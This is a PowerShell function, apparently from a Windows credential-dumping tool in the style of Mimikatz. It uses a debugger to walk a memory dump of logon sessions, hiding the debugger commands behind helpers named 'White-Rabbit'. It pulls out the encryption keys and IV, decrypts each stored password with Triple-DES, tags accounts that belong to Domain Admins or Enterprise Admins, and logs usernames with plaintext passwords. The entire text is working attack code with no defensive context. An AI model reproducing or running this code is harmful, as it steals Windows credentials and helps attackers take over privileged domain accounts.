﻿function Get-SupportedSystemsInformations ($buffer, $fullScriptPath) {      
    $chain = White-Rabbit1    
    Write-InFile $buffer "$chain"
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
    $chain42 = White-Rabbit42
    $tabFA = ($tab -split ' ')            
    $fi = [array]::indexof($tabFA,$chain42) + 4 
    $part1 = $tabFA[$fi]    
    $fi = [array]::indexof($tabFA,$chain42) + 5 
    $part2 = $tabFA[$fi]    
    $final = "$part2$part1"            
    $chain = "$chain42 $final"    
    Write-InFile $buffer $chain      
    $chain2 = White-Rabbit2  
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath        
    $sa = Clean-String $tab $mode $snapshot
    $command = "$chain2 $sa"    
    Write-InFile $buffer $command 
    $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"                      
    $tabSplitted = ($tab -split ' ')         
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}
    if($mode -eq "2r2") { $start = 40}    
    if($mode -eq "232") { $start = 38}    
    $j = 0
    $keyAddress = ""
    while($j -le 11) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else { 
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2 -or $j -eq 10) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }        
        $fi = [array]::indexof($tabSplitted,$chain2) + $value
        $keyAddress2 = $tabSplitted[$fi].Substring(0,2)
        $keyAddress1 = $tabSplitted[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet = $keyAddress               
    $chain = White-Rabbit3
    Write-InFile $buffer $chain    
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
    $tabf = ($tab -split ' ')    
    $fi = [array]::indexof($tabf,$chain42) + 4
    $firstAddress1 = $tabf[$fi]    
    $fi = [array]::indexof($tabf,$chain42) + 5
    $firstAddress2 = $tabf[$fi]    
    $firstAddress = "$firstAddress2$firstAddress1"            
    $chain = "$chain42 $firstAddress" 
    Write-InFile $buffer $chain             
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $arraySecondAddress = ($tab -split ' ')  
    if($mode -eq 232) { 
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 7
        $secondAddress = $arraySecondAddress[$fi]    
    }
    else {
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 10
        $secondAddress1 = $arraySecondAddress[$fi]    
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 11
        $secondAddress2 = $arraySecondAddress[$fi]    
        $secondAddress = "$secondAddress2$secondAddress1"  
    }             
    $chain = "$chain2 $secondAddress" 
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $ata = ($tab -split ' ')      
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}    
    if($mode -eq 232) { $start = 38}
    $j = 0
    $keyAddress = ""
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }
        $fi = [array]::indexof($ata,"$chain2") + $value
        $keyAddress2 = $ata[$fi].Substring(0,2)
        $keyAddress1 = $ata[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet2 = $keyAddress      
    $chain = White-Rabbit4           
    Write-InFile $buffer $chain         
    $iv = Call-MemoryWalker $memoryWalker $file $fullScriptPath                  
    $tab = ($iv -split ' ')        
    if($mode -eq 1 -or $mode -eq 132) { $start = 20}
    if($mode -eq 2) { $start = 30}
    $j = 0
    $iva = ""
    $start = 4
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            $value++
            $comma = ", "        
        }
        $fi = [array]::indexof($tab,"db") + $value   
        if($j -eq 7) {
            $iva1 = $tab[$fi].Substring(0,2)
        }
        else {
            $iva1 = $tab[$fi]
        }
        $iva += "$comma"+"0x$iva1"
        $j++
    }   
    $ivHex = $iva                    
    $chain = White-RabbitOrWhat
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
    $firstAddress = ""
    $tabf = ($tab -split ' ')    
    if($mode -eq 132 -or $mode -eq 232) {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $firstAddress = "$firstAddress1" 
    }
    else {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $fi = [array]::indexof($tabf,$chain42) + 5
        $firstAddress2 = $tabf[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1" 
    }    
    $firstAddressList = $firstAddress
    $nextEntry = ""
    $i = 0
    while ($firstAddressList -ne $nextEntry) {
        if($i -eq 0) {
            $nextEntry = $firstAddress            
            $command = "$chain42 $firstAddress"
        }
        else {            
            $command = "$chain42 $nextEntry"
        }          
        Write-InFile $buffer $command         
        $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        if($mode -eq 132 -or $mode -eq 232) {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                         
            }   
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]        
            $nextEntry = "$nextEntry1" 
        }
        else {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                
            } 
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]     
            $fi = [array]::indexof($tab,$chain42) + 5
            $nextEntry2 = $tab[$fi]    
            $nextEntry = "$nextEntry2$nextEntry1" 
        }           
        Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1        
        $tab = ($ddSecond -split ' ')           
        if($mode -eq 1) { $start = 48}
        if($mode -eq 132 -or $mode -eq 232) { $start = 17}
        if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}         
        $fi = [array]::indexof($tab,$chain42) + $start
        $la1 = $tab[$fi] 
        $fi = [array]::indexof($tab,$chain42) + $start + 1
        $la2 = $tab[$fi]    
        $la = "$la2$la1"                                           
        if($la -eq "0000000000000000"){
            $start = 24
            $fi = [array]::indexof($tab,$chain42) + $start
            $la1 = $tab[$fi]       
            $fi = [array]::indexof($tab,$chain42) + $start + 1
            $la2 = $tab[$fi]      
            $la = "$la2$la1"                                                    
        }          
        $tu = White-RabbitOK        
        $chain = "$tu $la"      
        Write-InFile $buffer $chain         
        $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        $tab = ($loginDB -split ' ')            
        $fi = [array]::indexof($tab,"du") + 4
        $loginPlainText1 = $tab[$fi]
        $loginPlainText = $loginPlainText1 -replace """",""                                     
        if (($partOfADomain -eq 1) -and ($adFlag -eq 1)) {
            $user = ""
            if(![string]::IsNullOrEmpty($loginPlainText)) {
	            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	            if(![string]::IsNullOrEmpty($user)) {
	                $user = $user.DistinguishedName   
	                $enterpriseAdminsFlag = "false"
	                $schemaAdminsFlag = "false"
	                $domainAdminFlag = "false"
	                $administratorsFlag = "false"
	                $backupOperatorsFlag = "false"
	                if($enterpriseAdmins -ne ""){
	                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
	                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                }
	                if($schemaAdmins -ne ""){
	                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
	                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                }
	                $domainAdminFlag = $domainAdmins.Contains($user)
	                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                $administratorsFlag = $administrators.Contains($user)
	                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                $backupOperatorsFlag = $backupOperators.Contains($user)
	                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	            }
            }
        }        
        Write-Progress -Activity "Getting valuable informations.." -status "Running..." -id 1         
        $tab = ($ddSecond -split ' ')    
        if($mode -eq 132 -or $mode -eq 232) { $start = 22}
        else {$start = 34}
        $fi = [array]::indexof($tab,$chain42) + $start
        $lp = $tab[$fi]
        $lp = $lp.Substring(6,2)            
        $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lp,16)/8) * 4            
        if($mode -eq 132 -or $mode -eq 232) {
            $fi = [array]::indexof($tab,$chain42) + 23
            $secondAddress1 = $tab[$fi]     
            $secondAddress = "$secondAddress1" 
        }
        else {
            $fi = [array]::indexof($tab,$chain42) + 36
            $secondAddress1 = $tab[$fi]  
            $fi = [array]::indexof($tab,$chain42) + 37
            $secondAddress2 = $tab[$fi]    
            $secondAddress = "$secondAddress2$secondAddress1"        
        }        
        $secondAddressCommand = "$chain2 $secondAddress"  
        Write-InFile $buffer $secondAddressCommand         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $tabSplitted = ($tab -split ' ')                  
        $pa11 = ""
        $pa2 = ""
        $j = 1
        $modJ = $j
        $begin = 4
        $stringP = ""
        while($j -le $numberBytes -and $j -le 64) {        
            if($j -eq 1) {
                $value = $begin
                $comma = ""
            }
            else {
                $goNextLine = $modJ%9            
                if($goNextLine -eq 0) {
                    $value = $value+3
                    $comma = ", "
                    $modJ++
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            $fi = [array]::indexof($tabSplitted,"$chain2") + $value                
            $pa2 = $tabSplitted[$fi].Substring(0,2)
            $pa1 = $tabSplitted[$fi].Substring(2,2)            
            $stringP += "$comma"+"0x$pa1, 0x$pa2"
            $j++
            $modJ++
        }        
        $pHex = $stringP                            
        Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"           
        if(($numberBytes % 8)) {        
            #$password = Get-DecryptAESPassword $pHex $keyToGet2 $ivHex
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }
        else {        
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }        
        Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
        $i++
    }
}